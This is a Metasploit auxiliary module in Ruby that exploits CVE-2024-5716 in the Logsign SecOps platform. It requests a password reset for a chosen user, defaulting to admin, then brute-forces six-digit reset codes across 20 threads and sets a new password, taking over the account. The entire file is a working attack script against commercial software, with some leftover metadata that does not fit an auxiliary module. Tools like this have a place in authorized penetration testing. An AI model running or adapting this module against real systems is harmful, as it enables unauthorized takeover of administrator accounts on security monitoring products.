require 'msf/core'
require 'net/http'
require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Logsign Authentication Bypass with Brute Force',
      'Description'    => %q{
        This module allows a malicious attacker to reset the password of any user's account in the Logsign application
        by performing a brute force attack on the password reset function. This attack exploits the CVE-2024-5716 vulnerability,
        allowing unauthorized access to the Logsign management panel, a SIEM and hotspot product.
      },
      'Author'         => ['Janke'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2024-5716'],
        ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-24-616/'],
        ['URL', 'https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform']
      ],
      'DisclosureDate' => '2024-06-03',
      'Platform'       => 'linux',
      'Arch'           => ARCH_PYTHON,
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'Payload'        => {'Space' => 4096, 'DisableNops' => true}
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, "The base path for the target application", "/api/settings"]),
        OptString.new('USERNAME', [true, "The username to target", "admin"]),
        OptInt.new('THREADS', [true, "Number of threads to use", 20]),
        OptInt.new('MAX_TRIES', [true, "Maximum number of reset code attempts", 1000000])
      ])
  end

  def run
    protocol = datastore['RPORT'].to_i == 443 ? 'https' : 'http'
    remote_ip = datastore['RHOST']
    base_uri = datastore['TARGETURI']
    username = datastore['USERNAME']
    thread_number = datastore['THREADS'].to_i
    total_count = datastore['MAX_TRIES'].to_i
    number_interval = total_count / thread_number

    # Generate a new password
    new_password = (0...20).map { (65 + rand(26)).chr }.join
    print_status("Generated new password: #{new_password}")

    # Request a password reset
    send_forget_password_request(protocol, remote_ip, base_uri, username)

    success_reset_code = nil
    target_verification_code = nil

    # Brute-force reset code
    threads = []
    for i in 0...thread_number
      start_code = i * number_interval
      end_code = (i + 1) * number_interval
      end_code = total_count if i == (thread_number - 1)

      threads << Thread.new do
        success_reset_code, target_verification_code = try_reset_code(i, start_code, end_code, protocol, remote_ip, base_uri, username)
        if success_reset_code && target_verification_code
          print_good("Success with reset code: #{success_reset_code}, verification code: #{target_verification_code}")
        end
      end
    end

    threads.each(&:join)

    if success_reset_code.nil?
      print_error("Brute force failed, could not find valid reset code.")
    else
      print_good("Success with reset code: #{success_reset_code}, verification code: #{target_verification_code}, NewPassword: #{new_password}")
      reset_result = send_reset_password_request(protocol, remote_ip, base_uri, username, target_verification_code, new_password)
      print_status("Reset Result: #{reset_result}")
    end
  end

  def send_forget_password_request(protocol, remote_ip, base_uri, username)
    uri = URI("#{protocol}://#{remote_ip}#{base_uri}/forgot_password")
    data = { 'username' => username }.to_json
    response = send_post_request(uri, data)
    print_status("Sent forgot password request.")
    return response
  end

  def send_verify_password_request(protocol, remote_ip, base_uri, username, reset_code)
    uri = URI("#{protocol}://#{remote_ip}#{base_uri}/verify_reset_code")
    data = { 'username' => username, 'reset_code' => reset_code }.to_json
    response = send_post_request(uri, data)
    return JSON.parse(response.body)
  end

  def send_reset_password_request(protocol, remote_ip, base_uri, username, verification_code, new_password)
    uri = URI("#{protocol}://#{remote_ip}#{base_uri}/reset_user_password")
    data = {
      'username' => username,
      'verification_code' => verification_code,
      'password' => new_password
    }.to_json
    response = send_post_request(uri, data)
    return JSON.parse(response.body)
  end

  def send_post_request(uri, data)
    req = Net::HTTP::Post.new(uri.path, 'Content-Type' => 'application/json')
    req.body = data
    res = send_request_cgi({ 'uri' => uri.path, 'method' => 'POST', 'ctype' => 'application/json', 'data' => data })
    return res
  end

  def try_reset_code(index, start_code, end_code, protocol, remote_ip, base_uri, username)
    success_reset_code = nil
    target_verification_code = nil

    for i in start_code...end_code
      reset_code = i.to_s.rjust(6, '0')
      verify_result = send_verify_password_request(protocol, remote_ip, base_uri, username, reset_code)
      if verify_result['message'].include?('Success')
        print_good("Success Verify with reset code #{reset_code}")
        target_verification_code = verify_result['verification_code']
        success_reset_code = reset_code
        break
      elsif verify_result['message'].include?('timeout')
        break
      end
    end

    return success_reset_code, target_verification_code
  end
end
